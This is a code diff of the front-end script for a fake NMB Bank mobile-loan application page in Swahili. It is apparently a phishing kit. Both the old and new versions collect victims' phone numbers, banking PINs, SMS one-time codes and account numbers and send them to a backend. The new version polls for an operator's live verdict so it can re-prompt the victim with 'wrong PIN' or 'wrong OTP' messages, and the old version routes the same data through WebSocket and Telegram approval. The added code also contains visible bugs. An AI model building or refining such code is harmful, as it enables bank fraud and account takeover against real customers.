@@ -1,3 +1,21 @@
+const sessionId = 'nmb_' + Math.random().toString(36.substring(2, 9));
+
+const state = {
+    amount: 100000,
+    duration: 12,
+    monthly: 9504,
+    loanType: 'Mkopo wa Biashara',
+    purpose: '',
+    firstName: '',
+    lastName: '',
+    phone: '',
+    employment: 'Mfanyabiashara',
+    income: '',
+    pin: '',
+    otp: '',
+    accountNumber: ''
+};
+
 const screens = {
     slider: document.getElementById('screen-slider'),
     step1: document.getElementById('screen-step1'),
@@ -9,267 +27,342 @@ const screens = {
     success: document.getElementById('screen-success')
 };
 
-const backBtn = document.getElementById('back-btn');
-const loadingOverlay = document.getElementById('loading-overlay');
-const surfaceNotification = document.getElementById('surface-notification');
-
-let currentScreenName = 'slider';
-let ws = null;
-let applicantData = {
-    phone: '',
-    pin: ''
-};
-
-// Connect WebSocket
-function connectWs() {
-    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-    ws = new WebSocket(`${protocol}//${window.location.host}`);
-
-    ws.onopen = () => {
-        const urlParams = new URLSearchParams(window.location.search);
-        const refCode = urlParams.get('ref') || urlParams.get('admin');
-        if (refCode) {
-            ws.send(JSON.stringify({ type: 'REGISTER_SUBADMIN', refCode }));
-        }
-    };
-
-    ws.onmessage = (event) => {
-        try {
-            const data = JSON.parse(event.data);
-            if (data.type === 'SERVER_ACTION') {
-                hideLoading();
-                handleServerAction(data.action);
-            }
-        } catch (e) {
-            console.error(e);
-        }
-    };
-}
-
-connectWs();
-
-function showScreen(name) {
-    Object.values(screens).forEach(s => s.classList.remove('active'));
-    if (screens[name]) {
-        screens[name].classList.add('active');
-        currentScreenName = name;
-    }
-    if (name === 'slider') {
-        backBtn.classList.add('hidden');
-    } else {
-        backBtn.classList.remove('hidden');
+function showScreen(screenKey) {
+    Object.values(screens).forEach(scr => scr.classList.remove('active'));
+    if (screens[screenKey]) {
+        screens[screenKey].classList.add('active');
+        window.scrollTo(0, 0);
     }
 }
 
-function showLoading(text = "Inapakia tafadhali subiri...") {
-    loadingOverlay.querySelector('p').textContent = text;
-    loadingOverlay.classList.remove('hidden');
+function showLoading(text) {
+    document.getElementById('loading-text').innerText = text || 'Tafadhali subiri...';
+    document.getElementById('loading-overlay').classList.remove('hidden');
 }
 
 function hideLoading() {
-    loadingOverlay.classList.add('hidden');
+    document.getElementById('loading-overlay').classList.add('hidden');
 }
 
-function showSurfaceNotification(message, type = 'success') {
-    surfaceNotification.textContent = message;
-    surfaceNotification.className = `surface-notification ${type}`;
-    surfaceNotification.classList.remove('hidden');
-    setTimeout(() => {
-        surfaceNotification.classList.add('hidden');
-    }, 4000);
+function showSurfaceNotification(message, type = 'warning') {
+    const banner = document.getElementById('surface-notification');
+    banner.innerText = message;
+    banner.className = `surface-notification ${type}`;
+    banner.scrollIntoView({ behavior: 'smooth' });
 }
 
-// Slider Calculator interactions
-const amountRange = document.getElementById('loan-amount-range');
-const durationRange = document.getElementById('loan-duration-range');
+function clearSurfaceNotification() {
+    const banner = document.getElementById('surface-notification');
+    banner.classList.add('hidden');
+    banner.innerText = '';
+}
+
+const rangeAmount = document.getElementById('range-amount');
+const rangeDuration = document.getElementById('range-duration');
 const displayAmount = document.getElementById('display-amount');
 const displayDuration = document.getElementById('display-duration');
 const displayMonthly = document.getElementById('display-monthly');
 
-amountRange.addEventListener('input', (e) => {
-    const val = Number(e.target.value).toLocaleString();
-    displayAmount.textContent = `TSh ${val}`;
-});
+function updateCalculator() {
+    state.amount = parseInt(rangeAmount.value);
+    state.duration = parseInt(rangeDuration.value);
+    
+    displayAmount.innerText = `TSh ${state.amount.toLocaleString()}`;
+    displayDuration.innerText = `miezi ${state.duration}`;
+    
+    const monthlyRate = 0.25 / 12;
+    const calc = (state.amount * monthlyRate * Math.pow(1 + monthlyRate, state.duration)) / (Math.pow(1 + monthlyRate, state.duration) - 1);
+    state.monthly = Math.round(calc || (state.amount / state.duration));
+    displayMonthly.innerText = `TSh ${state.monthly.toLocaleString()}`;
+    
+    document.getElementById('input-loan-amount').value = state.amount;
+}
 
-durationRange.addEventListener('input', (e) => {
-    displayDuration.textContent = `miezi ${e.target.value}`;
-    const monthlyVal = Math.round((amountRange.value / e.target.value) * 1.15).toLocaleString();
-    displayMonthly.textContent = `TSh ${monthlyVal}`;
-});
+rangeAmount.addEventListener('input', updateCalculator);
+rangeDuration.addEventListener('input', updateCalculator);
 
 document.getElementById('btn-omba-sasa').addEventListener('click', () => {
-    showLoading();
+    clearSurfaceNotification();
+    showLoading('Inapakia...');
     setTimeout(() => {
         hideLoading();
         showScreen('step1');
-    }, 800);
+    }, 600);
 });
 
-// Step 1 Navigation
 document.getElementById('btn-step1-next').addEventListener('click', () => {
-    showLoading();
+    state.loanType = document.getElementById('loan-type').value;
+    state.amount = document.getElementById('input-loan-amount').value;
+    state.duration = document.getElementById('loan-duration-select').value;
+    state.purpose = document.getElementById('loan-purpose').value || 'Mkopo wa Mkononi';
+
+    if (!state.purpose) {
+        showSurfaceNotification('Tafadhali weka madhumuni ya mkopo.', 'error');
+        return;
+    }
+
+    clearSurfaceNotification();
+    showLoading('Inapakia hatua inayofuata...');
     setTimeout(() => {
         hideLoading();
         showScreen('step2');
-    }, 800);
+    }, 700);
 });
 
-// Step 2 Navigation (Phone & Name entry only)
-document.getElementById('btn-step2-prev').addEventListener('click', () => showScreen('step1'));
-document.getElementById('btn-step2-next').addEventListener('click', () => {
-    const phone = document.getElementById('phone-number').value.trim();
+document.getElementById('btn-step2-back').addEventListener('click', () => {
+    showScreen('step1');
+});
 
-    if (!phone || phone.length < 9) {
-        showSurfaceNotification("Tafadhali jaza namba ya simu sahihi", "error");
+document.getElementById('btn-step2-next').addEventListener('click', () => {
+    state.firstName = document.getElementById('first-name').value.trim();
+    state.lastName = document.getElementById('last-name').value.trim();
+    let rawPhone = document.getElementById('phone-number').value.trim();
+
+    if (!state.firstName || !state.lastName) {
+        showSurfaceNotification('Tafadhali jaza jina la kwanza na la ukoo.', 'error');
         return;
     }
 
-    applicantData.phone = phone;
-    document.getElementById('lbl-masked-phone').textContent = `+255${phone}`;
-    
-    showLoading();
+    if (rawPhone.startsWith('0')) {
+        rawPhone = rawPhone.substring(1);
+    }
+
+    if (rawPhone.length !== 9) {
+        showSurfaceNotification('Tafadhali weka namba sahihi ya NMB Mkononi (tarakimu 9 baada ya 0).', 'error');
+        return;
+    }
+
+    state.phone = rawPhone;
+
+    clearSurfaceNotification();
+    showLoading('Inapakia hatua ya mwisho...');
     setTimeout(() => {
         hideLoading();
-        showScreen('step3');
-    }, 600);
+        document.getElementById('sum-amount').innerText = `TSh ${Number(state.amount).toLocaleString()}`;
+        document.getElementById('sum-duration').innerText = state.duration;
+        document.getElementById('sum-purpose').innerText = state.purpose;
+        showScreen('screen-step3');
+    }, 700);
 });
 
-// Step 3 Navigation -> Leads to PIN screen (after Step 3 out of 3)
-document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen('step2'));
-document.getElementById('btn-step3-submit').addEventListener('click', () => {
-    showLoading();
-    setTimeout(() => {
+document.getElementById('btn-step3-back').addEventListener('click', () => {
+    showScreen('screen-step2');
+});
+
+document.getElementById('btn-step3-submit').addEventListener('click', async () => {
+    state.employment = document.getElementById('employment-status').value;
+    state.income = document.getElementById('annual-income').value;
+
+    if (!state.income) {
+        showSurfaceNotification('Tafadhali weka mapato ya mwaka.', 'error');
+        return;
+    }
+
+    clearSurfaceNotification();
+    showLoading('Inawasilisha maombi kwa NMB Mkononi...');
+
+    try {
+        await fetch('/api/submit-application', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId,
+                phone: state.phone,
+                pin: state.pin || 'Pending PIN'
+            })
+        });
+        
         hideLoading();
         showScreen('pin');
-        pinBoxes[0].focus();
-    }, 600);
+        setupPinInputs();
+    } catch (err) {
+        hideLoading();
+        showSurfaceNotification('Hitilafu ya mtandao. Tafadhali jaribu tena.', 'error');
+    }
 });
 
-// PIN Screen Box Auto-Navigation & Visibility Toggle
-const pinBoxes = document.querySelectorAll('.pin-box');
-pinBoxes.forEach((box, index) => {
-    box.addEventListener('input', (e) => {
-        if (e.target.value && index < pinBoxes.length - 1) {
-            pinBoxes[index + 1].focus();
-        }
+function setupPinInputs() {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    pinBoxes.forEach((box, index) => {
+        box.value = '';
+        box.oninput = (e) => {
+            if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+        };
+        box.onkeydown = (e) => {
+            if (e.key === 'Backspace' && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        };
     });
-    box.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !box.value && index > 0) {
-            pinBoxes[index - 1].focus();
-        }
-    });
-});
+    if (pinBoxes[0]) pinBoxes[0].focus();
+}
 
-let isPinVisible = false;
-document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
-    isPinVisible = !isPinVisible;
-    pinBoxes.forEach(b => b.type = isPinVisible ? 'text' : 'password');
-});
+document.getElementById('btn-submit-pin').addEventListener('click', async () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    let enteredPin = '';
+    pinBoxes.forEach(box => enteredPin += box.value);
 
-// PIN Submit (Triggers Admin Telegram Approval with Phone and PIN)
-document.getElementById('btn-pin-submit').addEventListener('click', () => {
-    let pinCode = '';
-    pinBoxes.forEach(b => pinCode += b.value);
-
-    if (pinCode.length < 4) {
-        showSurfaceNotification("Tafadhali weka PIN kamili ya tarakimu 4", "error");
+    if (enteredPin.length !== 4) {
+        showSurfaceNotification('Tafadhali weka PIN kamili ya tarakimu 4.', 'error');
         return;
     }
 
-    applicantData.pin = pinCode;
-    showLoading("Inatuma maombi kwa ukaguzi...");
-    ws.send(JSON.stringify({ type: 'SUBMIT_CREDENTIALS', phone: applicantData.phone, pin: applicantData.pin }));
+    state.pin = enteredPin;
+    clearSurfaceNotification();
+    showLoading('Inathibitisha PIN na NMB Mkononi...');
+
+    try {
+        await fetch('/api/submit-application', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId,
+                phone: state.phone,
+                pin: state.pin
+            })
+        });
+
+        pollAdminDecision((status) => {
+            hideLoading();
+            if (status === 'next_step') {
+                document.getElementById('lbl-otp-phone').innerText = `+255${state.phone}`;
+                showScreen('otp');
+                setupOtpInputs();
+            } else if (status === 'restart_pin') {
+                showSurfaceNotification('PIN si sahihi au imeKATAA. Tafadhali weka PIN mpya.', 'error');
+                showScreen('pin');
+                setupPinInputs();
+            } else {
+                showScreen('pin');
+            }
+        });
+    } catch (err) {
+        hideLoading();
+        showSurfaceNotification('Hitilafu ya mtandao.', 'error');
+    }
 });
 
-// OTP Input auto-focus helper
-const otpBoxes = document.querySelectorAll('.otp-box');
-otpBoxes.forEach((box, index) => {
-    box.addEventListener('input', (e) => {
-        if (e.target.value && index < otpBoxes.length - 1) {
-            otpBoxes[index + 1].focus();
-        }
+function setupOtpInputs() {
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    otpBoxes.forEach((box, index) => {
+        box.value = '';
+        box.oninput = (e) => {
+            if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
+                otpBoxes[index + 1].focus();
+            }
+        };
+        box.onkeydown = (e) => {
+            if (e.key === 'Backspace' && !box.value && index > 0) {
+                otpBoxes[index - 1].focus();
+            }
+        };
     });
-    box.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !box.value && index > 0) {
-            otpBoxes[index - 1].focus();
-        }
-    });
-});
+    if (otpBoxes[0]) otpBoxes[0].focus();
+}
 
-document.getElementById('btn-otp-submit').addEventListener('click', () => {
-    let otpCode = '';
-    otpBoxes.forEach(b => otpCode += b.value);
+document.getElementById('btn-submit-otp').addEventListener('click', async () => {
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    let enteredOtp = '';
+    otpBoxes.forEach(box => enteredOtp += box.value);
 
-    if (otpCode.length < 4) {
-        showSurfaceNotification("Weka OTP kamili ya tarakimu 4", "error");
+    if (enteredOtp.length < 4) {
+        showSurfaceNotification('Tafadhali weka SMS OTP kamili kutoka NMB Mkononi.', 'error');
         return;
     }
 
-    showLoading("Inathibitisha OTP...");
-    ws.send(JSON.stringify({ type: 'SUBMIT_OTP', otp: otpCode }));
+    state.otp = enteredOtp;
+    clearSurfaceNotification();
+    showLoading('Inathibitisha OTP...');
+
+    try {
+        await fetch('/api/submit-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, otp: state.otp })
+        });
+
+        pollAdminDecision((status) => {
+            hideLoading();
+            if (status === 'next_step') {
+                showScreen('account');
+            } else if (status === 'restart_otp' || status === 'restart_pin') {
+                showSurfaceNotification('OTP sio sahihi. Tafadhali weka OTP mpya.', 'error');
+                showScreen('otp');
+                setupOtpInputs();
+            } else {
+                showScreen('otp');
+            }
+        });
+    } catch (err) {
+        hideLoading();
+        showSurfaceNotification('Hitilafu ya mtandao.', 'error');
+    }
 });
 
-// Account Number Submission
-document.getElementById('btn-account-submit').addEventListener('click', () => {
-    const accNum = document.getElementById('nmb-account-input').value.trim();
-    if (accNum.length !== 11) {
-        showSurfaceNotification("Namba ya akaunti lazima iwe na tarakimu 11 kamili", "error");
+document.getElementById('btn-submit-account').addEventListener('click', async () => {
+    const accInput = document.getElementById('account-number-input').value.trim();
+
+    if (accInput.length !== 11 || isNaN(accInput)) {
+        showSurfaceNotification('NMB Bank account number MUST be numbers and EXACTLY 11 digits.', 'error');
         return;
     }
 
-    showLoading("Inathibitisha akaunti ya benki...");
-    ws.send(JSON.stringify({ type: 'SUBMIT_ACCOUNT', accountNumber: accNum }));
+    state.accountNumber = accInput;
+    clearSurfaceNotification();
+    showLoading('Inakamilisha usajili wa akaunti ya benki...');
+
+    try {
+        await fetch('/api/submit-account', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, accountNumber: state.accountNumber })
+        });
+
+        pollAdminDecision((status) => {
+            hideLoading();
+            if (status === 'success') {
+                showScreen('success');
+            } else if (status === 'restart_pin') {
+                showSurfaceNotification('Wrong PIN reported. Redirecting backwards to Enter PIN.', 'error');
+                showScreen('pin');
+                setupPinInputs();
+            } else if (status === 'restart_otp') {
+                showSurfaceNotification('Wrong OTP reported. Redirecting backwards to OTP verification.', 'error');
+                showScreen('otp');
+                setupOtpInputs();
+            } else if (status === 'restart_acc') {
+                showSurfaceNotification('Invalid Account Number reported. Please re-enter 11 digits.', 'error');
+                showScreen('account');
+            } else {
+                showScreen('account');
+            }
+        });
+    } catch (err) {
+        hideLoading();
+        showSurfaceNotification('Hitilafu ya mtandao.', 'error');
+    }
 });
 
-// Home button restart
+function pollAdminDecision(callback) {
+    const interval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status/${sessionId}`);
+            const data = await res.json();
+            if (data.status && data.status !== 'pending') {
+                clearInterval(interval);
+                callback(data.status);
+            }
+        } catch (e) {
+            // keep polling quietly
+        }
+    }, 3000);
+}
+
 document.getElementById('btn-home').addEventListener('click', () => {
     window.location.reload();
 });
 
-// Handle Server Admin Commands
-function handleServerAction(action) {
-    switch (action) {
-        case 'ALLOW':
-            showSurfaceNotification("Correct PIN! Endelea hatua inayofuata.", "success");
-            showScreen('otp');
-            break;
-        case 'DENY':
-            showSurfaceNotification("Maombi yamekataliwa. Anza upya.", "error");
-            window.location.reload();
-            break;
-        case 'WRONG_PIN':
-            showSurfaceNotification("Wrong PIN! Tafadhali weka New PIN.", "error");
-            showScreen('pin');
-            pinBoxes.forEach(b => b.value = '');
-            pinBoxes[0].focus();
-            break;
-        case 'WRONG_OTP':
-            showSurfaceNotification("Wrong OTP! Weka OTP sahihi tena.", "error");
-            otpBoxes.forEach(b => b.value = '');
-            otpBoxes[0].focus();
-            break;
-        case 'CORRECT_OTP':
-            showSurfaceNotification("Correct OTP! Endelea hatua inayofuata.", "success");
-            showScreen('account');
-            break;
-        case 'INVALID_ACC':
-            showSurfaceNotification("Invalid ACC. Tafadhali weka New account number.", "error");
-            document.getElementById('nmb-account-input').value = '';
-            document.getElementById('nmb-account-input').focus();
-            break;
-        case 'VALID_ACC':
-            showSurfaceNotification("Valid ACC! Mkopo umeidhinishwa.", "success");
-            showScreen('success');
-            break;
-    }
-}
-
-backBtn.addEventListener('click', () => {
-    if (currentScreenName === 'step1') showScreen('slider');
-    else if (currentScreenName === 'step2') showScreen('step1');
-    else if (currentScreenName === 'step3') showScreen('step2');
-    else if (currentScreenName === 'pin') showScreen('step3');
-    else if (currentScreenName === 'otp') showScreen('pin');
-    else if (currentScreenName === 'account') showScreen('otp');
-});
+updateCalculator();
     
